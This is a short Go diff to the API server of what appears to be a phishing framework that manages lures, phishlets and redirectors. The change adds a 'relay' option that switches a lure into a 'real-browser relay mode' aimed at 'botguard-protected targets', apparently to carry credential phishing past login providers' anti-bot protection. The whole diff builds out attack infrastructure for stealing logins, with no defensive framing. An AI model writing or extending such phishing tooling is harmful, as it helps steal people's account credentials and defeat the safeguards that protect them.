@@ -721,6 +721,7 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 			Redirector      *string `json:"redirector"`
 			Phishlet        *string `json:"phishlet"`
 			PausedUntil     *int64  `json:"paused"`
+			Relay           *bool   `json:"relay"`
 		}
 		if e := json.NewDecoder(r.Body).Decode(&req); e != nil {
 			http.Error(w, `{"error":"bad body"}`, http.StatusBadRequest)
@@ -730,6 +731,10 @@ func (a *apiServer) handleLureItem(w http.ResponseWriter, r *http.Request, rest 
 			// pause the lure until the given unix time (0 = resume now);
 			// paused lures serve the block page instead of the login flow
 			l.PausedUntil = *req.PausedUntil
+		}
+		if req.Relay != nil {
+			// toggle real-browser relay mode (botguard-protected targets)
+			l.Relay = *req.Relay
 		}
 		if req.Phishlet != nil {
 			if _, e := a.cfg.GetPhishlet(*req.Phishlet); e != nil {
